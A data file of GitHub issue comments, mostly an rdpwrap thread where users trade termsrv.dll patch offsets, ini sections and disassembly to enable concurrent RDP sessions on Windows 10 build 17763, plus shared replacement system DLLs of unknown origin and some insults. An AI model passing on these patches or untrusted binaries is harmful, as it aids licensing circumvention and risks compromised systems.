msgpack-python/msgpack/338/458030979,338,"msgpack is JSON-like format.  Msgpack can be used anywhere JSON is used. It is used very widely, more than you think. And authenticated or not is not matter. That's why I released 0.6.1. ",,False
objectbox-java/objectbox/375/300141976,375,"Issue Basics  ObjectBox version (are using the latest version?) ? 1.4.1  Reproducibility [occurred once only | occasionally without visible pattern | always] always   Reproducing the bug Description Describe the situation in English in which you encounter the bug. Just create a project that uses the library via gradle. No need for code. The bug is that the IDE will warn about having these lines in gradle, even though I don't have them. They appear only when using this library. Here's a sample project MyApplication.zip The warnings you get Code *Provide the code triggering the bug. No need Logs &amp; stackstraces *Check if you have relevant logs and/or a stacktrace. No need Entities Provide the code for entities related to the bug (shorten to relevant parts). None Misc *Is there anything special about your app? No Did you find any workarounds to prevent the issue?* No ",,False
objectbox-java/objectbox/375/368420243,375,"In case this is an IDE/gradle issue, I've written about it here as well ",,False
objectbox-java/objectbox/375/372234399,375,"Thanks for reporting. The ObjectBox Gradle plugin did still add a dependency (jsr305) using the  configuration instead of the new . This was already fixed and will be released with the next version of the plugin (is in , but it has a bug, so wait for  or higher). -ut ",,False
objectbox-java/objectbox/375/372236093,375,"Is it available? If so, how can I use it? ",,False
objectbox-java/objectbox/375/372236481,375,"If it's not available, why close this? ",,False
objectbox-java/objectbox/375/372318151,375,"Closed because it is fixed (!= released), the fix will be released with the next update (likely 1.4.6). -ut ",,False
objectbox-java/objectbox/375/372319874,375,"How could I verify it's fixed, if it's not released... Therefore it doesn't make sense to close it. The issue still exists in all versions that are available. ",,False
objectbox-java/objectbox/375/372320987,375,"Just re-open the issue or comment if the fix is not successful. See our comments and the milestone info to learn what release an issue was resolved in. This is how we handle issues, please adapt.  -ut ",,False
objectbox-java/objectbox/375/372322805,375,"@friend I can't, because it's not available, and once it is available, I won't be notified about it. And even if I do get notified, how could I dig into all the issues to get here, if it's closed... It should have been this way  issue reported issue confirmed (and if not, closed) issue fixed bug fixed published, including telling here that it's published. anyone who subscribed to the bug report (me in this case) get notification and can check it back. confirmation that it indeed got fixed, and can be closed.  ",,False
openshot-qt/OpenShot/2189/367401978,2189,"Spent a couple of hours making a video. All I did was add audio and text over the footage. I put everything in place. I watched it over to make sure everything was timed right. Everything was saved. I'd opened it up a couple of times having taken breaks and all... And then when it exports it doesn't look right at all. It's as if the clips had scrambled. I open the project file again, same thing. Everything was jumbled and half of the text I'd added was no longer there. It'd show the box but not the text. Haven't been able to produce a single video yet with this awful software and after uninstalling it, I never will. Windows 10, Asus, 8G of ram and all that other useless nonsense. Just updated the software today. ",,False
openshot-qt/OpenShot/2189/427537263,2189,"@friend We are sorry about the terrible experience you have had with our software. If you still willing to help sort out the issue can you please fill out the information below. Describe the bug A clear and concise description of what the bug is. System Details (please complete the following information)  Operating System / Distro [e.g. Windows 10, Linux Mint 17.1] OpenShot Version [e.g. 2.4.1]  To Reproduce Steps to reproduce the behavior  Go to '...' Click on '....' Scroll down to '....' See error  Expected behavior A clear and concise description of what you expected to happen. Screenshots If applicable, add screenshots to help explain your problem. Logs If you are experiencing a crash, please collect and attach logs of the problem. Additional context Add any other context about the problem here. ",,False
orm/doctrine/7192/313696087,7192,"I migrate a mysql db to sqlAnywhere(sqla) to test my app developed with Doctrine2. Acces to sqla works, DQL like $query = $em-&gt;createQuery('SELECT e FROM countries e WHERE e.conlng = lng ); $query-&gt;setParameters(array(     'lng' =&gt; 'DE'             )); $result = $query-&gt;getResult(); also runs funny. $query = $em-&gt;createQuery('SELECT e FROM countries e WHERE e.connum = num ); $query-&gt;setParameters(array(     'num' =&gt; '4'             )); $result = $query-&gt;getResult(); also no problems! BUT! $query = $em-&gt;createQuery('SELECT e FROM countries e WHERE e.conlng = lng AND e.connum = num'); $query-&gt;setParameters(array(     'lng' =&gt; 'DE',     'num' =&gt; '4',             )); $result = $query-&gt;getResult(); doesn't work!! $result = empty! with operator OR it's the same problem! Any idea! # ",,False
papirus-icon-theme/PapirusDevelopmentTeam/1453/417597962,1453,"you don't want to respect us, we don't respect you ",,False
phpstan/phpstan/1856/404256377,1856,"I can't find any formal documentation for this project and the readme doesn't seem to give any indication as to what, exactly, this tool does. Compare this with phpstan-strict-rules, which is very clear and up-front about what it does, specifying in the head of the readme everything it checks for. Why is a plug-in more useful than the thing its plugging into? That seems backwards to me. ",,False
phpstan/phpstan/1856/458515731,1856,"I honestly don’t get your opinion. I recently removed a list of checks because it was outdated and caused a visual clutter  of this tool is a verification that it’s useful so I recommend you to try it out. What it does is in the first paragraph of the current README it. It catches whole classes of bugs even before you write tests for the code. It moves PHP closer to compiled languages in the sense that the correctness of each line of the code can be checked before you run the actual line. If you want to read more, there’s a link to Medium.com article which is also in the readme  this issue as invalid, while scratching my head... On Tue, 29 Jan 2019 at 1257, Bilge notifications@friend.com wrote -- Ondřej Mirtes ",,False
phpstan/phpstan/1856/458516009,1856,"Writing somewhere a list of checks is not a good fit for human consumption because it’s overwhelming. Rather than that, I welcome everyone to try it on their codebase... ",,False
phpstan/phpstan/1856/458519147,1856,"The popularity of the project is clear, but i'm inclined to agree with the OP here (despite phrasing not being very constructive). Exhaustive docs and lists of options are nice. Compare with rector (which is auto generated) or psalm, which do this very well. ",,False
phpstan/phpstan/1856/458520650,1856,"I’d love to hear about a use-case for this. It’s clear that static analysis is a must have for PHP projects now and it’s most valuable to know what kind of issues it finds on your projects. Instead of a long wall of text, there should be a better way to present it. Currently, the best way is to run PHPStan on your code. I don’t want to write something that no one will read. Instead, I’d like to design something that fulfills a use-case, but I don’t know what the use-case is. On Tue, 29 Jan 2019 at 1317, Ben Davies notifications@friend.com wrote -- Ondřej Mirtes ",,False
phpstan/phpstan/1856/458520998,1856,"Btw I already do comprehensive release notes for each release so if you’re interested in what’s new (that’s a use case!), I’ve got you covered. On Tue, 29 Jan 2019 at 1322, Ondřej Mirtes ondrej@friend.cz wrote -- Ondřej Mirtes ",,False
phpstan/phpstan/1856/458522032,1856,"If you cannot (or will not) attempt to understand me, I suppose there's nothing we can do. Too bad, because @friend seems to have understood perfectly. The last time someone told me to ""just run it"", with regards to software, was when I received a virus on ICQ circa 200x. Nowadays I prefer to know what I'm running. ",,False
phpstan/phpstan/1856/458523221,1856,"PHPStan is open-source. You have the option to learn what you’re running. There’s very readable rules configuration and a test suite that you can use for this purpose. And of course source code itself. You can even contribute the documentation you’d like to see present. Since I already took out portion of my day to reply to you, and I don’t like when my software is compared to a virus, I’m locking this conversation. Thanks for understanding. On Tue, 29 Jan 2019 at 1328, Bilge notifications@friend.com wrote -- Ondřej Mirtes ",,False
phpstan/phpstan/1856/458523676,1856,I also invited you to brainstorm ideas how the documentation should look so I’m very sad it ended in this non-constructive way. ,,False
rabbitmq-website/rabbitmq/559/342202798,559," Doesn't look too good to me on an open source project page 😔. Also the TrustArc/Truste popup is really annoying and slow. Is it necessary as this site provides nothing that's under the ""Functionality NOT Allowed"" right?  ",,False
rabbitmq-website/rabbitmq/559/405904797,559,"There is NO advertising on this site, go dive into the source. Besides Google Analytics and Twitter, and perhaps YouTube embeds on the home page there are no trackers involved. We are required to use TrustArc by our corporate sponsor. We are looking at alternatives (there is no ETA) or at least a separate instance that does not contact 300 services of which we only use 2 or 3. ",,False
rabbitmq-website/rabbitmq/559/405906532,559,"Those who absolutely don't want TrustArc or any trackers have the option of running a local instance of the site. See the README, it is straightforward. Once you have a local copy running, remove Google Analytics, TrustArc and Twitter from the layout. ",,False
rabbitmq-website/rabbitmq/559/410097502,559,FTR we've switched to a new instance of TrustArc that only contacts the services we use. Our testing suggests that moving to Required Only cookies now takes about 2-4 seconds now as opposed to over 2 minutes when this issue was filed. ,,False
rdpwrap/stascorp/606/445476315,606,"Well,  it does work on the latest CU update to Win10., I am only allowed one connection at a time. When I log on other users get kicked off I am using Win10 Pro 64 Bit. ",,False
rdpwrap/stascorp/606/445481228,606,"Just tested this again !! IS WORKING !!  I can use one and more (Multi) Connection without kicked out. My Testbed is VM-host (win10x64pro) and the Client In VM is Win10x64Home. Fast test was done with RDPCheck.exe and RDPConf.exe to Show „single user session“ not checked !R Regards Von quicken2k Gesendet Samstag, 8. Dezember 2018 1838 An stascorp/rdpwrap Cc hajubu; Comment Betreff Re [stascorp/rdpwrap] Looking for 10.0.17763.168 support (#606) Well, it does work on the latest CU update to Win10., I am only allowed one connection at a time. When I log on other users get kicked off I am using Win10 Pro 64 Bit. — You are receiving this because you commented. Reply to this email directly, view it on GitHub, or mute the thread. ",,False
rdpwrap/stascorp/606/445492105,606,Good day. I installed 17763.168. And it all stopped working. Please tell me in detail what needs to be done to make it work again?  ,,False
rdpwrap/stascorp/606/445492722,606,17763.168 was installed now I also have stopped working LOL version 1809 was working so goo until now ,,False
rdpwrap/stascorp/606/445493640,606,"hey haijubu, I followed the steps in #601 and I did the ♠net stop TermService net start TermService` and after that I did a reboot but this is what I get  and I'm unable to connect via RDP to my server. Right now I'm connected via TermViewer and this is what I tried  It's still the same and I'm unable to connect. I have Windows 10 Enterprise installed with legit license I tried starting it manually from services and this is what I get  Any help would be appreciated. I only want multiple people to be able to connect using RDP at the same time, that is all Thanks ",,False
rdpwrap/stascorp/606/445495000,606,Update Little modification and this is where I stand now  I had to restart manually but still no luck I also added 3389 to firewall rules. Both UDP and TCP for both incoming and outgoing just in case it might help. Still no luck ,,False
rdpwrap/stascorp/606/445507620,606,"Once you install December 5, 2018—KB4469342 (OS Build 17763.168) CU update it limits the termserv.dll to one connection at a time, I  did have a backup of termsrv.dll, replaced it, and now it is working again. Just a heads-up in case anyone else runs into the issue. ",,False
rdpwrap/stascorp/606/445522418,606,I managed to do. I took the file from this post  it at home. And I added lines from the same post to my rdpwrap.ini file.  ,,False
rdpwrap/stascorp/606/445557111,606,I think I understand just copy and Paste 10.0.17763.1 data for .165 and a .168 correct? Dumb Question why doesn't the RDPWrap-V1.62 update.bat do this for us? ,,False
rdpwrap/stascorp/606/445536091,606,"Hello Team, I did a full  recheck for all version/builds 17763.1,.165,.167, .168   // last CU KB4469342 (v168.1.10 ) and SSU KB4470788 both from 2018-12-04 // msuSSU must be installed before CU , only the 'older' KB4469342 (cab) should/(must) be overwritten. I also installed KB4471331(adobe flash) and  KB 4469041 -preview CU upd NetFramew.3.5/4.72) which I believe not so important // 2 TestBeds)  host x64pro and client x64 (Pro AND Home)  __ !! ARE WORKING  in both direction !!    i.e. local RDPcfg ,RDPchk and ""life"" from 17763.168 and to VM-Client-17763.165,.167,.168        AND a real x64pro-PC to  a x64Home-PC      Look at #601 - hajubu posts (2018-11-21, -22 build .165, 18-12-07 and -08 -------2018-11-21------------ Something has changed from 17763.1 (incl .55, .107 and .134) to 17763.165 in the x64-data [10.0.17763.165]  // LocalOnlyOffset.x64=xxxxx  //xxxxx.(17763.1) =77941 ♢ xxxxx.(17763.165) =77AF1 ( tested and validated ) all other x64-ini-data for 1809rs517763.1 to .134 are the same as .165-data hint SingleUserOffset.x64=132F9 may be also ==1322C as in the original-ini from 2018-10-10 -------2018-11-22------------- 1) ;--------snip-----from here  ...  [10.0.17763.165] ...to... ;--------snip------------- 2) ;--------snip-----from here  ...  [10.0.17763.165SL-Init] ...to... ;--------snip------------- 3) read the snip ;------------------------use as batch / cmd ------------------------- or save it to a txt.file 4) termsrv.dll was meanwhile updated to .167(18-11-27) and .168(18-12-04),  offsets seems to be the same as in .165. Therefore (if you have a need for it ) just change the ini header for the ""new"" build or ................ Add for each build a section for [10.0.17763.nnn] and [10.0.17763.nnn-SLInit] with the data (in #601 -hajubu)  using the snipping data [10.0.17763.165] and [10.0.17763.165-SLInit]. ------2018-12-08---------- Additional Remarks given another team member For each build , you need the two ini-Section [10.0.17763.nnn] and [10.0.17763.nnn-SLInit] / nnn= (1 , 165, 167, 168 ) is given, which contains both (.x64 and .x86) offset-values. This ensures that all these builds will be recognized. I did a replication of my findings (snip-listing Sections [10.0.17763.165] and [10.0.17763.165-SLInit] above) for all three 177763.nnn-builds (165,167,168), adding these section by taking the original build from 2018-10-10 from the repository,containing already the both 177763.1 Sections( with 64 and x86)  whereby the build-number were set according to the wanted build. (! There is a main difference from build 17763.1 to 17763.165). For better reading (and -may be- for the init of rdp-wrapper )                       I did put each section for itself  behind 17763.1 and  behind 17763.1-Slinit. Please be aware not stumbling over a) os-bit version b) not using ""net stop TermService"" and changing the ""newly"" edited ini-file. See my comment for a risk of overwriting this file using unmodified ""install.bat/uninstall.bat"" or the ""update.bat"" . batch/cmd in 3) and it might be a good idea  to change in the [Main] section the Updated=yyyy-mm-dd  to your ""year-month-day"" figures e.g. 2018-12-09 c) after you have replaced the ini-file do restart the ""PC"" or at least use ""start net TermService"".   Stopping and starting may have another trips/tripping , restart the system can be a better idea. Remark Each build 17763.1 , .165 , 167 , 168 comes with an own ""build"" version of Termsrv.dll ( x64,x86). The rfxvmt.dll (x64 , x86 ) has always 17763.1, whereby the the added (older) rfxvmt.dll in syswow64 from the rdp-wrapper install also still works fine. Therefore in x64 you have several choices to circumvent the stumbling stones. Please let me know if this helped. Getting the Termsrv.dll and rfxvmt.dll from the dedicated install.wim (x64 / x86) or do a simple VM install of the OS-build of your choice ( my recommendation) and follow up the workflow, Exchanging a  ""dll""  in a system you have to have special rights as you know already for sure.  ",,False
rdpwrap/stascorp/606/445559699,606,"@friend wrote …. I think I understand just copy and Paste 10.0.17763.1 data for .165 and a .168 correct? &gt;&gt;&gt; NO  … why doesn't the RDPWrap-V1.62 update.bat do this for us?         &gt;&gt;&gt;  RDP-Wrapper repository (                 rdpwrap.ini  Is still on Updated=2018-10-10 and                 contains only  the ini-sections for  Win10 1809 RTM                                 [10.0.17763.1]   and [10.0.17763.1-SLInit]  REMARK ; I'm pretty sure that it will be updated as soon $MS-Tuesday in Decmeber18 works fine out. From 17763.1 to 17763.165 are Offset-Differences [10.0.17763.165] // LocalOnlyOffset.x64=xxxxx //xxxxx.(17763.1) =77941 ♢ xxxxx.(17763.165) =77AF1 // ( tested and validated ) For each build , you need the two ini-Section [10.0.17763.nnn] and [10.0.17763.nnn-SLInit] / nnn= (1 , 165, 167, 168 ) is given, which contains both (.x64 and .x86) offset-values. Contains the SAME Data (except the Header inside the square-brackets)     1)        Paste and copy from my post in #601 -hajubu - 2018-11-22                  [10.0.17763.165] and [10.0.17763.165-SLInit]     2)         Replicate copy of data in .165 to new ini section inside each Header to           [10.0.17763.167] and [10.0.17763.167-SLInit]     3)         Replicate copy of data in .165 to new ini section inside each Header to           [10.0.17763.168] and [10.0.17763.168-SLInit] Iinfo from build .1 up to .134 Data for 10.0.17763.1 are the same (.1) And from 1.65 up to .168 are the same  But the termserv.dll build have different internal build numbers -&gt; own numbered data sections    Please be aware not tripping over „Windows OS stumbling Stones“   data ownership // security Levels // etc   Read my remarks  for using stopping and starting net termservice  • Good Luck ",,False
rdpwrap/stascorp/606/445561798,606,"@friend, @friend @friend , @friend, @friend , @friend, @friend  I wrote down the exact steps I did in (#601). This works fine for 10.17763.168. I think this is the most comprehensive way to understand what to get it working. Thanks to @friend and @friend 👍 🥇 ",,False
rdpwrap/stascorp/606/446676805,606,Can someone upload the working dll and ini files here? ,,False
rdpwrap/stascorp/606/445575362,606,"Andre wrote  @friend, @friend @friend , @friend, @friend , @friend, @friend  I wrote down the exact steps I did in (#601). This works fine for 10.17763.168. I think this is the most comprehensive way to understand what to get it working. Thanks to @friend and @friend 👍 🥇 Hello Team, I just want to add that we do have still an open point to be cleared. This open point  could have a ""hidden"" influence to the ""single user session"" - function ( even I could not see/find/obeserve a wrong/not exspected reaction up til now in my Testbed. I do prefer the logical position of the SingleUserOffset  according to  the ""official"" rdpwrap.ini Release (2018-10-10)  up till now  ( 17134.1 , 17763.1 ) 17134.1 == ; SingleUserOffset.x64=1511C  17763.1 == ; SingleUserOffset.x64=1322C UNTIL WE KNOW BETTER. b.r. Hajubu ;--------------------------------------------- ;This logical  position was already used in 17134.1  IN rdpwrap.ini UNTIL 2018-10-10 ; SingleUserPatch.x64=1 ;.text0000000180015100 ; int64 fastcall CSessionArbitrationHelperMgrIsSingleSessionPerUserEnabled(…) ;.text0000000180015119    mov     dword ptr [rax+8], 1    dword ptr  [rax+8],1 &lt;--Zero  ; SingleUserOffset.x64=1511C ;--------------------------------------------- ;--------------------------------------------- ;  --  first seen ;  --  Github StasCorp/Code/res ;  --  original rdpwrap ini 2018-10-10 ;. --  17763.1  ; validated .1 up to .134 and .165,.167 ,.168 ; SingleUserPatch.x64=1 ;.text0000000180013210 ; int64 fastcall CSessionArbitrationHelperMgrIsSingleSessionPerUserEnabled(...) ;.text0000000180013229    mov     dword ptr [rax+8], 1  &lt;-- Zero   C7 08 '01' 00 00 00  ; SingleUserOffset.x64=1322C ;--------------------------------------------- ;--------------------------------------------- ;  --  first seen --  Github StasCorp/rdpWrap ;  --  #601 @friend 2018-11-16 ;  --  and furthermore in myDigitalLife Forum -- ;  --  17763.165 - 168 ; SingleUserPatch.x64=1 ;.text00000001800132E0 ; int64 fastcall CSessionArbitrationHelperIsSingleSessionPerUserEnabled() ;.text00000001800132F7    mov     dword ptr [rdx], 1 &lt;-- Zero  C7 02 '01' 00 00 00  ; SingleUserOffset.x64=132F9 ;--------------------------------------------- ",,False
rdpwrap/stascorp/606/446684949,606,"@ Tom wrote ( Tom Forever)  Just read #611 for the actual data needed ; you should Need Nothing else.  10.0.17763.194 - CU KB4471332 - keeps/lifts the termsrv.dll to its file version 10.0.17763.168. Therefore since .165, .167, .168 use the data-offset, which are the same, we have to add to the rdpwrap.ini dated 2018-10-10 ( last.ini in the repository - code res\rdpwrap,ini). Ensure you have the correct ini file with two ini-sections [10.0.17763.1] , [10.0.17763.1-SLInit] and add then the two sections [10.0.17763.168], [17763.168-SLInit] Keep an eye on Acces Rigths and at least use ""stop net termservice"" before you exchange the rdpwrap.ini (2018-10-10) with your newly edited ini file. ---read more in #611 Or  If is to keen just wait  till the updated „official“ and validated Version of rdpwrap.ini will be  given into the repository (Code res\rdpwrap.ini) then you can just push the button after you have updated your OS to Version 10.0.17763.194 (-.1.5). My recommendation is just do your Job in a VM/VBox  with the last ISO e.g. even the RTM 17763.1 will do it for any purpose , you want (x64,x86 – Home, Pro, etc). Then you can pick up what you ever need for your purpose. .Good Luck Von Tom Gesendet Mittwoch, 12. Dezember 2018 1841 An stascorp/rdpwrap Cc hajubu; Mention Can someone upload the working dll and ini files here? ",,False
rdpwrap/stascorp/606/447677783,606,I edited rdpwrap.ini edit for 17763.168 pursuant to #611. Works excellent for me. Thanks for making my life easier. ,,False
rdpwrap/stascorp/606/448430150,606,"This is very very much, not a dumb question, at all. I'd love to know myself to be honest. ",,False
rdpwrap/stascorp/606/448450689,606,I attempted the warezio ini file linked here  has resulted in my machine being no longer accessible. Recommend others avoid for time being until this is fixed. I have also moved my Windows 10 on to the 'slower' release channel for updates. ,,False
rdpwrap/stascorp/606/448495576,606,"LOL, I like your post. But it is not correct. Only the -SLInit sections are (at least for versions till 194) are equal. The [10.17763.xxx] sections are different for each version. ",,False
rdpwrap/stascorp/606/448503154,606,"Regardless, end users just want to hit ""update.bat"" in Admin mode and have it work a minute or two later, you know? ",,False
rdpwrap/stascorp/606/448531020,606,"@friend  wrote  Regardless, end users just want to hit ""update.bat"" in Admin mode and have it work a minute or two later, you know? … up till now there is no „automatic“ solution Ready for „update.bat“- Button Meanwhile  you can use a manually Job see last post of vibaaa in #611 he had managed it too He added also his tested rdpwrap.ini – using the official data from the repo and added the necessary data section. @ andrePKI also had given a very short „cooking recipee“ how doing the Exchange of the rdpwrap.ini. BTW – I’m just an user like you ! Good Luck ! ",,False
rdpwrap/stascorp/606/448832138,606,"I have tried number of ways from other threads, finally I came up a simple and workable solution for both x32 and x64 edition.  First, install rdpwrap v1.62  to Administrative command prompt, then run ""net stop termservice"" Replace rdpwrap.ini attached (It supports both x32 and x64) Go to Administrative command prompt, then run ""net start termservice"" Finally, go to C\Program Files\RDP Wrapper folder, run RDPConf to check the states Make sure All states are green Congrats! You should now be able to RDP to your desktop.  If Listener state is not green, please do the following-  Go to Administrative command prompt, then run ""net stop termservice"" Replace termsrv.dll and rfxvmt.dll in c\windows\system32 (Please download the correct OS version) Repeat Step 4 to 6 above.  Hope this helps. rfxvmt_32bit.zip rfxvmt_64bit.zip termsrv_x32.zip termsrv_x64.zip rdpwrap.zip  ",,False
rdpwrap/stascorp/606/448836025,606,The original developer of this project is a lazy Russian asshole I swear. ,,False
rdpwrap/stascorp/606/448858167,606,"I like the instructions you provided @friend , but I advise against replacing any Windows components. It's much better to find out why what is on the machine does not work. View properties of termsrv.dll, get the version, and make sure that section is present in the ini file. Again, I like the instructions. ",,False
rdpwrap/stascorp/606/448933773,606,"I think most of the people like me just want to fix the issue and get it work again. I'd leave this to someone who is really interested in finding the root cause. BTW, those two files termsrv.dll and rfxvmt.dll are extracted from Build 10.0.17763.194. x32 and x64. Thanks ",,False
rdpwrap/stascorp/606/449626122,606,"Anything above worked for me. Need an effective solution, please ",,False
rdpwrap/stascorp/606/449664769,606,"This would be great if we had an official fix that work out of the box instead of zillions uncomprehensible, confusing, contradictory and incomplete instructions here and in other issues that may or may not work... I know this just does not happen magically so thanks in advance to whoever maintains this program. ",,False
rdpwrap/stascorp/606/449716999,606,"Like many others, I was also having issues getting RDPWrap to work after updating my Windows 10 install to 10.0.17763.195. I had tried literally everything recommended in this issue and/or referenced in others to no avail. However, I was surprised to find the following commands worked for me and it is now running fine. rdpwinst.exe -u rdpwinst.exe -i I am not sure why these two commands fixed it for me as I had uninstalled / reinstalled using the bat files numerous times. Just thought I'd share in case this could potentially help someone else. ",,False
rdpwrap/stascorp/606/449912350,606,"Link But maybe it doesn't work fine for me. My OSversion is Win10 Home 17763.195. Operating as the instuction, I met a problem on step 4, part 1. After I started termservice via , it shut immediately. I don't know what's wrong. Is there any other solution? BTW, I've test it on both of my two computers with the same OS version. It worked nowhere. ",,False
rdpwrap/stascorp/606/450068614,606,"Finally I figured it out for 195. You don't need to dlls, just the .ini file. HOWEVER, there is a small issue with the ini file provided by explorerhk. You need to add a newline (the enter key) at the end of the file!!! Just then follow explorerhk's instructions and it will work! (at least on Windows 10 pro) ",,False
rdpwrap/stascorp/606/450008401,606,I can confirm issues with the provided .ini I have a PC WIN10 pro 17763.195 working fine after updating .ini as described. Another PC with same OS Version is not working. RDP service crashes immediately after updateting .ini and restarting service. ,,False
rdpwrap/stascorp/606/450139129,606,"Hi, Been trying around, but so far no luck. Did manage to get ""Fully supported"", but listening state keeps saying ""Not listening"". Any idea's? ",,False
rdpwrap/stascorp/606/450221374,606,"Just got back from holiday, thank you for finding the root cause. I made a little bit clean up of my original ini   file before uploading to GitHub, that's why I didn't realize the issue. I have uploaded the new ini file to my original reply again, hope this helps. ",,False
rdpwrap/stascorp/606/450211172,606,Working fix The problem was with the line endings (LF instead of CRLF) rather than a missing newline. Here is the fixed  file (from #612) to put into  need to restart the service (or windows) for it to take effect ,,False
rdpwrap/stascorp/606/450164458,606,"@friend Thanks a lot. The modified .ini is working for me (new line - ENTER at the end)!  By the way, it is a little bit confusing that a non modified .ini is working for another PC with WIN 2010 pro, too. But I am not worried about that, because it is working on all of my PCs now. ",,False
rdpwrap/stascorp/606/450232573,606,@friend  tried your files and Listener State is still NOT LISTENING followed these steps  net stop termservice replaced termsrv.dll and rfxvmt.dll  installed rdpwrap replaced rdp.ini net start termservice reboot  win x64 pro 10.0.17763.195  ,,False
rdpwrap/stascorp/606/450251184,606,"@friend, you should not be replacing or modifying any windows components when rdpwrap is used. You should only use what Microsoft put on your machine. ",,False
rdpwrap/stascorp/606/450318167,606,But the recomendation not worked for version 10.0.17763.168 ( ,,False
rdpwrap/stascorp/606/450315662,606,"Hi Everyone, I have tried with this .ini file and it worked for me, it's for 10.0.17763.167 version x64 rdpwrap.zip  ",,False
rdpwrap/stascorp/606/450263332,606,"You may need to revert the DLLs back to the original. I found that the dll from rfxvmt_64bit.zip is a different size compared to the original.  Then just follow @friend's instructions with the fixed ini file  First, install rdpwrap v1.62  to Administrative command prompt, then run ""net stop termservice"" Replace rdpwrap.ini in C\Program Files\RDP Wrapper (The new file supports both x32 and x64) Go to Administrative command prompt, then run ""net start termservice"" Finally, go to C\Program Files\RDP Wrapper folder, run RDPConf to check the states Make sure All states are green Congrats! You should now be able to RDP to your desktop.  ",,False
rdpwrap/stascorp/606/450352262,606,"Hello, I have the same problem see message from smiler999 ",,False
rdpwrap/stascorp/606/450382137,606,"I'm new to RDPWrap &amp; Github so please forgive me for not understanding protocol here, but I don't understand something.... This program appears dead, as there has been no official support since it ""broke"" last month, yet the author (binarymaster) continues to stop by time to time to ""close"" issues that are very obviously still open. So if this program has been abandoned, why bother to come and close the issues? If it has not been abandoned, why not at least a comment saying ""I am working on it""? Please clarify, thanks! ",,False
rdpwrap/stascorp/606/450382913,606,"I just wanted to confirm that this is working on my fully updated system.  The fixed ini file is all that is needed.  I couldn't get it working since I was trying to used the modified dlls (so don't use those!) Luckily I backed up the original files before using the modified dlls. I will restate instructions for people on winver 10.0.17763.195 (10.0.17763.168 in RDPConf).  I am assuming you already have rdpwrap installed but it isn't working.  Download the fixed ini file in explorerhk's post above or here rdpwrap.zip  2.Extract the ini to your desktop.  Run cmd as Administrator  net stop termservice  Open Explorer and go to \Program Files\RDP Wrapper  Drag and drop the ini on the desktop in to RDP Wrapper\ and replace the file in the destination.  Assuming you have your original dlls in System32\  go back to the cmd window and net start termservice  Check RDPConf   I will upload my dlls here as well for anyone that already deleted them and don't have them in the Recycle Bin. termsrv.dll need TrustedInstaller to be owner, so make that change when you put it in System32\ I' dlls.zip m not sure what other permissions are necessary.  ",,False
rdpwrap/stascorp/606/450385077,606,"Probably closing them since people keep asking how to fix something that has already been addressed. Check out my post above if you are on the same version, it should work. ",,False
rdpwrap/stascorp/606/450420444,606,"ditchmagnet's post above resolved my issue, thanks bud ",,False
rdpwrap/stascorp/606/450427257,606,"@friend thanks a lot, works great again  10.0.17763.195 x64 pro ",,False
rdpwrap/stascorp/606/450663074,606,@friend - confirming a working solution; thank you.  10.0.17763.195 (10.0.17763.168) x64 PRO ,,False
rdpwrap/stascorp/606/450758695,606,"Now have RDPWrap working again.  However, cannot restrict to single user session despite the box checked.  Any suggestions to restrict to one session per user?  ",,False
rdpwrap/stascorp/606/450953033,606,I'm curious why this rdpwrap.ini doesn't get updated with the Update.bat ? ,,False
rdpwrap/stascorp/606/451194130,606,Because it is not updated in repository yet. ,,False
rdpwrap/stascorp/606/451322609,606,"Howcome though? There's now, definitely a good ini file out there, I got one from someone nearly a week ago and even then, a week ago, i thought it was late. ",,False
rdpwrap/stascorp/606/451335637,606,Err...perhaps the developer/maintainer is busy with life or is waiting to insure the proposed changes don't cause other issues. ,,False
rdpwrap/stascorp/606/451385206,606,"Not my project but I would suggest that Priority #1 should be to include any new termsrv offsets as soon as they allow concurrent sessions, even if there are side issues. Surely the Issues area would be better suited for users to report bugs with the newer offsets rather than being an experimental/discussion zone where we're explaining to n00bs over and over how to patch their own rdpwrap.ini. There's already an  update.bat script, but it's essentially useless if the ini file is years out of date. Having the rdpwrap.ini file in two places also causes confusion - at first I did not even know that RDPWrap installs itself to Program Files and that there is where the file should be updated. I propose that if we push the updated offsets to all users sooner, then we will have a bigger pool of users and developers to report on and resolve any bugs that arise, and the issues area could be focused on dealing with real bugs rather than duplicate ""latest build not working"" reports and manual patching tutorials.. /2c ",,False
rdpwrap/stascorp/606/451420809,606,↑↑↑ This is the reason why I and many others do not publish hobby works. It ain't commercial project with a dedicated support team. Be thankful for whatever service is provided by (likely) one dude in his/her spare time. ,,False
rdpwrap/stascorp/606/451422653,606,"Uh, no. As someone who actually publishes open-source software I can say that there is abuse on both sides. On the one hand you have people demanding something for nothing. On the other hand you have people hiding behind terrible projects with ""it's free so be happy for what you get"". The latter is just as bullshit as the former. Stop polluting the internet with broken-ass projects. This noise prevents others from stepping in with better solutions because they think someone else is already handling it. In this particular case, it would take the author all of 10 seconds to post ""I am aware of this issue. Thank you for your contributions. I will be release an update in the near future."" For those of you wanting to see a quicker resolution to this issue, I suggest publishing a Pull Request such as  Then the author just needs one minute to review, click a button, and release an update. ",,False
rdpwrap/stascorp/606/451424122,606,Lol - presumed entitlement is a beautiful thing. Good suggestion on the pull request. ,,False
rdpwrap/stascorp/606/451699268,606,"Hey, i am new to rdp. I hope someone can help me. My RDP Check looks good but i can`t open    I got an Error that says The computer was unable to connect to another console session on the remote computer because a console session is already active. ",,False
rdpwrap/stascorp/606/451699611,606,"Tick the check box ""single session per user"" ",,False
rdpwrap/stascorp/606/451699963,606,The same . Restartet and no change  With RDP Checker it works but not with mstsc.exe ,,False
rdpwrap/stascorp/606/451700893,606,Yes. with RDPcheck.exe i can open more.  ,,False
rdpwrap/stascorp/606/451701282,606,The screenshot shows a RDP to local host. Initiate RDP by another PC. ,,False
rdpwrap/stascorp/606/451701899,606,From Tablet it works. can i open rdp from local too? ,,False
rdpwrap/stascorp/606/451702432,606,OS prevents RDP to local host. I know there are some work arounds for XP (e.g. changing standard port for RDP). But I do not know if there are work arounds for Win 10 as well. I have no need for local RDP. ,,False
rdpwrap/stascorp/606/451704231,606,I just found a solution. Used 127.0.0.2 to rdp local ,,False
